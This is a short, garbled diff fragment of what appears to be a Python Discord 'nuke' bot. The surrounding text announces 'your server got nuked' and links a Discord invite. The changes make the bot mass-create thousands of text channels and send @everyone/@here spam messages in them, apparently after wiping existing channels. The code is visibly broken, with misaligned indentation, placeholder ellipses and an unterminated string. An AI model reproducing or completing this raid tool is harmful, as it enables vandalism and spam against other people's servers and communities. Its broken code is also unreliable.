@@ -29,12 +29,9 @@ your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKd
             pass
 
     # Create new channels
-    for i in range(1, 51):
-        channel = await ctx.guild.create_text_channel(f"general-{i}")
-       for i in range(...):
+      for i in range(2000, 5000):
     channel = ...
-    await channel.send(...)
-@everyone @everyone
-@everyone @everyone @everyone @everyone @everyone @everyone
-@everyone join this for appeal  https://discord.gg/RY5gS7yKdD
-""")
+    message = """
+    text
+    "@everyone @here @everyone @everyone @everyone @everyone"
+    await channel.send(message)
